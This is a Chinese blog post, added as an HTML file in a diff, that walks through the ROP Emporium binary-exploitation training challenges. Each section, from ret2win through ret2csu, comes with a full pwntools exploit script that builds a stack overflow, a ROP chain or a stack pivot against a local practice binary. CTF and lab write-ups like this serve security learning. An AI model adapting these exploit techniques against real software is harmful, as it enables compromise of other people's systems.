@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>ROP Emporium | BW-jitang</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://jitang-BW.github.io/favicon.ico?v=1698753168785">
+<link rel="stylesheet" href="https://jitang-BW.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="ret32win
+拖进ida，pwnme函数比较可疑，点进去发现有栈溢出，Shift+F12寻找字串，“/bin/cat flag.txt”就在之中，找到调用地址为400756，书写exp。
+from pwn import *
+ 
+ p =..." />
+    <meta name="keywords" content="gadgets,PWN" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://jitang-BW.github.io">
+        <img src="https://jitang-BW.github.io/images/avatar.png?v=1698753168785" class="site-logo">
+        <h1 class="site-title">BW-jitang</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      温故而知新
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jitang-BW.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">ROP Emporium</h2>
+            <div class="post-date">2023-10-10</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="ret32win">ret32win</h1>
+<p>拖进ida，pwnme函数比较可疑，点进去发现有栈溢出，Shift+F12寻找字串，“/bin/cat flag.txt”就在之中，找到调用地址为400756，书写exp。</p>
+<pre><code>from pwn import *
+ 
+ p = process('./ret2win')
+
+context (os='linux',arch='amd64')
+
+p.recvuntil('x86_64\n')
+
+flag = 0X400756
+
+payload = b'a'*(0x20 + 8) + p64(flag)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>运行脚本拿到shell。</p>
+<h1 id="split">split</h1>
+<p>checksec一下，是nx保护。考虑构造rop链<br>
+数组0x20字节，找到cat flag.txt地址<br>
+<img src="https://jitang-BW.github.io/post-images/1697287778677.png" alt="" loading="lazy"><br>
+用ROPgadget找一下pop rdi<br>
+<img src="https://jitang-BW.github.io/post-images/1697287770388.png" alt="" loading="lazy"><br>
+找system地址<br>
+<img src="https://jitang-BW.github.io/post-images/1697287802458.png" alt="" loading="lazy"><br>
+构造exp</p>
+<pre><code>from pwn import *
+p = process('./split')
+
+pop_addr = 0x4007C3
+bin_addr = 0x601060
+system= 0x40074B
+ 
+payload = b'a'*(0x20+0x8) + p64(pop_addr) + p64(bin_addr) + p64(system)
+p.recvuntil(b'&gt; ')
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://jitang-BW.github.io/post-images/1697359911597.png" alt="" loading="lazy"></figure>
+<h1 id="callme">callme</h1>
+<p>没什么思路，看一下hint</p>
+<p><img src="https://jitang-BW.github.io/post-images/1697287885170.png" alt="" loading="lazy"><br>
+大概就是三个数组都调用一次并且输入指定字符</p>
+<p>那么直接找数组溢出0x20+8<br>
+因为每次输入三个参数，找pop rdi pop rds pop rdx<br>
+<img src="https://jitang-BW.github.io/post-images/1697288041230.png" alt="" loading="lazy"></p>
+<p>构造exp</p>
+<pre><code>from pwn import *
+p = process('./callme')
+
+one_addr = 0x400720
+two_addr = 0x400740
+three_addr = 0x4006f0
+pop_ret = 0x40093c
+payload = b'a'*0x28 + p64(pop_ret) + p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d) + p64(one_addr) + p64(pop_ret) + p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xD00DF00DD00DF00D) + p64(two_addr) + p64(pop_ret) + p64(0xdeadbeefdeadbeef)+p64(0xcafebabecafebabe)+p64(0xd00df00dd00df00d) + p64(three_addr)
+#p.sendlineafter(b&quot;&gt; &quot;,payload)
+#p.recvuntil(b' ')
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="write4">write4</h1>
+<p>打开ida,shift+f12没有字符串，没有找到熟悉的flag.txt。需要手动填入（考虑填入bss段）。ropgadget找一下gatget，通过 pop r14 和 r15，把 bss 段的地址和 'flag.txt')，放到这俩寄存器里面</p>
+<p>然后通过：mov r14,r15 把字符串放到 bss 段，这样放就能放入flag.txt了，最后在printfile中打印出flag</p>
+<p><img src="https://jitang-BW.github.io/post-images/1697338659400.png" alt="" loading="lazy"><br>
+<img src="https://jitang-BW.github.io/post-images/1697339937761.png" alt="" loading="lazy"></p>
+<p>exp</p>
+<pre><code>
+from pwn import *
+plt_printfile = 0x400510
+pop_r14_r15_ret = 0x400690
+mov_r14_r15_ret =0x400628
+bssaddr = 0x601038
+pop_rdi_ret = 0x400693
+p = process('./write4')
+#gdb.attach(p,&quot;b *main&quot;)
+payload = b'A'*0x20 + p64(0) 
+payload += p64(pop_r14_r15_ret)
+payload += p64(bssaddr)
+#payload += p64(0x7478742e67616c66)  # &quot;flag.txt&quot;
+payload += b'flag.txt'
+payload += p64(mov_r14_r15_ret)  
+
+payload += p64(pop_r14_r15_ret)
+payload += p64(bssaddr)
+payload += p64(mov_r14_r15_ret)  
+
+payload += p64(pop_rdi_ret)
+payload += p64(bssaddr)
+payload += p64(plt_printfile)
+
+p.recvuntil('&gt; ')
+p.send(payload)
+p.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://jitang-BW.github.io/post-images/1697338547926.png" alt="" loading="lazy"></figure>
+<h1 id="badchars">badchars</h1>
+<p>这道题思路和write4差不多，但是这个程序包含几个坏字符的时候并不能插入到程序中，看了网上一些资料，发现使用异或或者解码可以解决这个问题</p>
+<p>我选择用加减ascII的方法解码xga.，剩下的和上一题基本一致</p>
+<figure data-type="image" tabindex="3"><img src="https://jitang-BW.github.io/post-images/1697351972174.png" alt="" loading="lazy"></figure>
+<p>找到几个有用的gadget<br>
+xor_r14r15 = 0x400628<br>
+add_r14r15 = 0x40062c<br>
+sub_r14r15 = 0x400630<br>
+mov_r12r13 = 0x400634<br>
+pop_r12r13r14r15 = 0x40069c<br>
+pop_r14r15 = 0x4006a0<br>
+pop_rdi = 0x4006a3<br>
+write_addr = 0x601030</p>
+<pre><code>from pwn import *
+context.log_level = 'debug'
+
+io = process('./badchars')
+elf = ELF('./badchars')
+
+xor_r14r15 = 0x400628
+add_r14r15 = 0x40062c
+sub_r14r15 = 0x400630
+mov_r12r13 = 0x400634
+pop_r12r13r14r15 = 0x40069c
+pop_r14r15 = 0x4006a0
+pop_rdi = 0x4006a3
+write_addr = 0x601030
+
+badchars = 'xga.'
+
+payload = b'b' * 40
+payload += p64(pop_r12r13r14r15) + b'flbh/tyt' + p64(write_addr) + p64(1) + p64(write_addr + 2)		# a-&gt;b g-&gt;h .-&gt;/ x-&gt;y then just -1
+payload += p64(mov_r12r13)
+payload += p64(sub_r14r15)
+payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 3)
+payload += p64(sub_r14r15)
+payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 4)
+payload += p64(sub_r14r15)
+payload += p64(pop_r14r15) + p64(1) + p64(write_addr + 6)
+payload += p64(sub_r14r15)
+payload += p64(pop_rdi) + p64(write_addr)
+payload += p64(elf.plt['print_file'])
+
+io.sendlineafter(b'&gt; ', payload)
+
+io.interactive()
+
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://jitang-BW.github.io/post-images/1697354939338.png" alt="" loading="lazy"></figure>
+<h1 id="fluff">fluff</h1>
+<p>查看gadget</p>
+<figure data-type="image" tabindex="5"><img src="https://jitang-BW.github.io/post-images/1697739998405.png" alt="" loading="lazy"></figure>
+<p>最绝望的一集，只能看wp的无力感，其他七道题做完再返回来做还是没有明确的开始思路，明白找到哪几个gadget是有用的，剩下的就是将flag.txt字符写入到程序再print_file出来，不会怎么找出来的，但是可以说说后面的操作</p>
+<h2 id="大概操作">大概操作</h2>
+<p>xlat 指令可以将寄存器的值作为地址，并将其指向的存储单元中的数据加载到 al 寄存器的低 8 位中；<br>
+bextr 指令可以从一个源操作数中提取位块，并将其放置在目标操作数的最低有效位；<br>
+stosb 指令可以将 al 寄存器的值写入 rdi 寄存器所指向的地址中。<br>
+可以使用的 gadget 是：</p>
+<p>pop rdi; ret: 用于将参数传递给调用的函数;<br>
+pop rdx; pop rcx; add rcx,rdx; bextr rbx,rcx,rdx: 用于将 flag.txt 写入内存，并用 bextr 指令进行位操作;<br>
+xlat byte ptr [rax]: 将 al 寄存器当前的值（第一遍时值为零）作为地址；<br>
+mov byte ptr [rdi], al: 将 al 寄存器的值写入 rdi 寄存器所指向的地址中。</p>
+<h2 id="所以构造步骤应该是">所以构造步骤应该是：</h2>
+<p>首先是填充缓冲区，并且构造一个从 pop_rdi_gadget 之后开始的过程的调用，将项“flag.txt”写入内存。</p>
+<p>然后是对每个字符执行位操作，将结果存储在输出缓冲区中（每个字节都有自己的用于存储的地址，可以在代码中看到）。</p>
+<p>输出缓冲区中现在的位模式是 00 00 00 00 00 00 01 66。</p>
+<p>使用print_file的地址以及 .bss 段中 flag.txt 字符串的地址来调用函数。</p>
+<h2 id="exp">exp</h2>
+<pre><code>from pwn import *
+from string import *
+context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])
+
+io=process(&quot;./fluff&quot;)
+
+flag_addr=[0x4003C4,0x4003C5,0x4003D6,0X4003CF,0x4003FD,0x4003D8,0x400246,0x4003D8] #flag.txt
+flag=b&quot;flag.txt&quot;
+pop_rdi_ret=0x4006a3
+xlat_addr=0x400628  #mov al,[al+rbx]   al rax低8位
+pop_rdx_pop_rcx_add_rcx_bextr_addr=0x40062A  #mov rbx,rcx,rdx
+stosb_addr=0x400639  #mov [rdi],al
+func_addr=0x400510
+bss_addr=0x601038
+payload=cyclic(0x28)
+for i in range(0,8):
+    payload+=p64(pop_rdx_pop_rcx_add_rcx_bextr_addr)
+    payload+=p64(0x2000)  #0x20 8位16进制数占4字节，4bytes=32bits
+    if i==0:
+        payload+=p64(flag_addr[i]-0x3EF2-0xb)
+    else:
+        payload+=p64(flag_addr[i]-0x3EF2-int(flag[i-1]))
+    payload+=p64(xlat_addr)
+    payload+=p64(pop_rdi_ret)
+    payload+=p64(bss_addr+i)
+    payload+=p64(stosb_addr)
+
+payload+=p64(pop_rdi_ret)+p64(bss_addr)+p64(func_addr)
+
+gdb.attach(io)
+pause()
+
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p>得到结果</p>
+<figure data-type="image" tabindex="6"><img src="https://jitang-BW.github.io/post-images/1697740625161.png" alt="" loading="lazy"></figure>
+<p><em><strong>最难过的一集，我会好好记住这道题的</strong></em></p>
+<h1 id="pivot">pivot</h1>
+<p>这道题最头疼的地方就是开了nx保护同时还开了pie保护，hint显示去看so文件的plt和got表项，可以用来计算偏移量</p>
+<p>打开程序发现对溢出的字节控制的十分严格，同时是个二次输入溢出，将栈上转到堆上执行，再去调用so文件中的ret2win文件</p>
+<figure data-type="image" tabindex="7"><img src="https://jitang-BW.github.io/post-images/1697733675416.png" alt="" loading="lazy"></figure>
+<p>看一下gadget</p>
+<figure data-type="image" tabindex="8"><img src="https://jitang-BW.github.io/post-images/1697734597454.png" alt="" loading="lazy"></figure>
+<p>有用的在下面</p>
+<pre><code>0x00000000004006b0 : call rax
+0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
+0x00000000004009c4 : add rax, rbp ; ret
+0x00000000004009bb : pop rax ; ret
+0x00000000004007c8 : pop rbp ; ret
+0x00000000004009bd : xchg rax, rsp ; ret
+</code></pre>
+<p>那么思路就是利用foothold_function函数的plt地址，利用mov eax, [eax] gadget获取到foothold_function的.got.plt，再利用foothold_function与ret2win的偏移，计算出ret2win的实际地址</p>
+<p>第一部分的 ROP 链主要是为了泄漏 foothold_function 函数在 GOT 表中的地址，然后计算出 ret2win 函数在 libpivot.so 中的地址，第二部分的 ROP 链则是利用栈迁移和 ret2win 漏洞来获取 flag</p>
+<p>exp</p>
+<pre><code>from pwn import *
+
+p = process(&quot;./pivot&quot;)
+elf = ELF(&quot;./pivot&quot;)
+lib = ELF(&quot;./libpivot.so&quot;)
+
+xchg_rax_rsp = 0x4009bd
+pop_rax = 0x4009bb
+pop_rbp = 0x4007c8
+mov_rax_rax = 0x4009c0
+add_rax_rbp = 0x4009c4
+call_rax = 0x4006b0
+
+foothold_plt = elf.plt['foothold_function']
+foothold_got = elf.got['foothold_function']
+offset = int(lib.sym['ret2win']-lib.sym['foothold_function'])
+leakaddr = int(p.recv().split()[20],16)
+
+def step1():
+
+    payload_1 = p64(foothold_plt)
+    payload_1 += p64(pop_rax)
+    payload_1 += p64(foothold_got)
+    payload_1 += p64(mov_rax_rax)
+    payload_1 += p64(pop_rbp)
+    payload_1 += p64(offset)
+    payload_1 += p64(add_rax_rbp)
+    payload_1 += p64(call_rax)
+    
+    p.sendline(payload_1)
+
+def step2():
+
+    payload_2 = b&quot;a&quot; * 40
+    payload_2 += p64(pop_rax)
+    payload_2 += p64(leakaddr) 
+    payload_2 += p64(xchg_rax_rsp)
+    
+    p.recvuntil(&quot;&gt;&quot;)
+    p.sendline(payload_2)
+    
+    print(p.recvall())
+
+if __name__ == &quot;__main__&quot;:
+    step1()
+    step2()
+</code></pre>
+<p>成功过关<br>
+<img src="https://jitang-BW.github.io/post-images/1697734977871.png" alt="" loading="lazy"></p>
+<h1 id="ret2csu">ret2csu</h1>
+<p>打开文件第一眼很抽象，还有加密文件，ida一看不出所料地pwnme函数，那就还是栈溢出，怎么样来栈溢出解密呢？</p>
+<p>这里看到usefulFunction函数有传进去三个参数，那么这题大概率就是传参来解密喽<br>
+<img src="https://jitang-BW.github.io/post-images/1697736126513.png" alt="" loading="lazy"></p>
+<p>然后在ret2win函数里发现了好东西<br>
+<img src="https://jitang-BW.github.io/post-images/1697736421590.png" alt="" loading="lazy"></p>
+<p>即为满足a1 == 0xDEADBEEFDEADBEEFLL &amp;&amp; a2 == 0xCAFEBABECAFEBABELL &amp;&amp; a3 == 0xD00DF00DD00DF00DLL即可输出flag.txt</p>
+<p>现在传参解密的思路被我们确定是对的了，那么接下来就是找gadgets来构造rop链</p>
+<p>OK，甚至找不到pop rdx的身影，那么如何传进去三个参数呢<br>
+<img src="https://jitang-BW.github.io/post-images/1697737664468.png" alt="" loading="lazy"></p>
+<p>这时候我们需要更加仔细的观察ida中的文件，下面的一个关键点我在另一个大佬的博客上看见，很震惊<br>
+<img src="https://jitang-BW.github.io/post-images/1697738228491.png" alt="" loading="lazy"></p>
+<p>藏得很深，恰好是三个寄存器的mov指令，call的地址也很巧妙，正好空出来第四个寄存器，那么他的返回地址应该到哪里才对呢，这位师傅同样给出了答案</p>
+<figure data-type="image" tabindex="9"><img src="https://jitang-BW.github.io/post-images/1697738478278.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://jitang-BW.github.io/post-images/1697738550347.png" alt="" loading="lazy"></figure>
+<p>rsp一加一减刚刚好（逆天）</p>
+<p>然后参考写了个exp</p>
+<p>理解如下：定义了常量 dereferenceable_addr，表示一个可以进行间接寻址的地址，以及 ret2win，表示要调用的函数 ret2win 的 plt 地址</p>
+<p>构造了一个名为 rop_chain 的字符串，其中包含了第一部分 ROP 链和第二部分 ROP 链。第一部分 ROP 链利用 ret2csu 技术调用函数，将需要的参数传递给函数并调用它。具体步骤为：</p>
+<p>将需要的参数存入寄存器 rax、rdi、rsi 和 rdx 中；<br>
+调用 ret2csu gadget，在函数执行前将这些参数依次存入栈中，并通过调用函数地址实现对函数的调用；<br>
+调用 ret2csu gadget 时，需要将其本身作为第一个参数传入（即将 RBX 设为 0）。<br>
+第二部分 ROP 链则是调用 ret2win 函数，将必要的参数传递给它并进行调用。具体步骤为：</p>
+<p>使用 pop_rdi_ret gadget 将 0xdeadbeefdeadbeef 地址存入 RDI 中；<br>
+调用 ret2win 函数</p>
+<pre><code>from pwn import *
+ 
+# Set the pwntools context
+context.arch = 'amd64'
+context.log_level = 'debug'
+ 
+# Project constants
+PROCESS = './ret2csu'
+io = process(PROCESS)
+ 
+# Debugging
+'''
+gdbscript = &quot;b *0x0040069a&quot;
+pid = gdb.attach(io, gdbscript=gdbscript)
+'''
+ 
+# ROP Gadgets
+pop_rdi_ret = p64(0x004006a3)                       # pop rdi; ret;
+ 
+# The third stack value needs to be the RSP value
+ret2csu_gadget_staging = p64(0x0040069a)            # pop rbx;
+                                                    # pop rbp;
+                                                    # pop r12;
+                                                    # pop r13;
+                                                    # pop r14;
+                                                    # pop r15;
+                                                    # ret
+ 
+ret2csu_gadget_call_offset = p64(0x00400680)        # mov rdx, r15; 
+                                                    # mov rsi, r14;
+                                                    # mov edi, r13d;
+                                                    # call qword [r12 + rbx*8]
+ 
+'''
+Pointer to an executable location with the following gadget:
+sub rsp, 8;
+add rsp, 8;
+ret;
+'''
+dereferenceable_addr = p64(0x00600e48)
+ret2win = p64(io.elf.plt['ret2win'])
+ 
+ 
+'''
+R15 = RDX = 0xd00df00dd00df00d
+R14 = RSI = 0xcafebabecafebabe
+R13 = RDI = 0xdeadbeefdeadbeef
+R12 = 0x00600e48
+RBX = 0x0
+'''
+ 
+# Craft the ROP chain
+rop_chain = b&quot;&quot;.join([
+    ret2csu_gadget_staging,
+    p64(0),                     # RBX = 0
+    p64(0x01),                  # RBP = 0x01; this is important so that we can avoid the conditional jump in __libc_csu_init after calling the dereferenced address
+    dereferenceable_addr,       # R12 = pointer to a safe address to dereference
+    p64(0xdeadbeefdeadbeef),    # R13 = RDI = 0xdeadbeefdeadbeef
+    p64(0xcafebabecafebabe),    # R14 = RSI = 0xcafebabecafebabe
+    p64(0xd00df00dd00df00d),    # R15 = RDX = 0xd00df00dd00df00d
+    ret2csu_gadget_call_offset, # Call the value of the dereferenced address
+ 
+    p64(0),                     # Align the stack so that after the values pop, we still have control of it
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+    p64(0),                     
+ 
+    pop_rdi_ret,                # Adjust RDI back to 0xdeadbeefdeadbeef
+    p64(0xdeadbeefdeadbeef),
+    ret2win                     # Call ret2win with the necessary arguments
+])
+ 
+# Craft the payload
+offset = 40
+padding = b&quot;A&quot; * offset
+payload = b&quot;&quot;.join([
+    padding,
+    rop_chain
+])
+ 
+# Send the payload
+io.clean()
+io.sendline(payload)
+io.interactive()
+
+</code></pre>
+<p>理解中的疑惑：</p>
+<p>几个p64(0)的作用是什么：<br>
+目的是为了对齐栈。ret2csu gadget 需要通过 pop 指令从栈上连续弹出六个值，分别存入寄存器 rbx、rbp、r12、r13、r14 和 r15 中。由于栈的字节对齐要求，因此这些值必须依次按照 8 字节对齐存放在栈上。</p>
+<p>ret2scu学习好图，贴一下<br>
+<img src="https://jitang-BW.github.io/post-images/1697739266192.png" alt="" loading="lazy"></p>
+<p>成果如下<br>
+<img src="https://jitang-BW.github.io/post-images/1697737372270.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://jitang-BW.github.io/tag/9AOU3kUZ_/" class="tag">
+                    gadgets
+                  </a>
+                
+                  <a href="https://jitang-BW.github.io/tag/0jiN4r7VI/" class="tag">
+                    PWN
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://jitang-BW.github.io/post/ZIZN_yt8a/">
+                  <h3 class="post-title">
+                    2023 newstarctf新生赛 week1 pwn
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
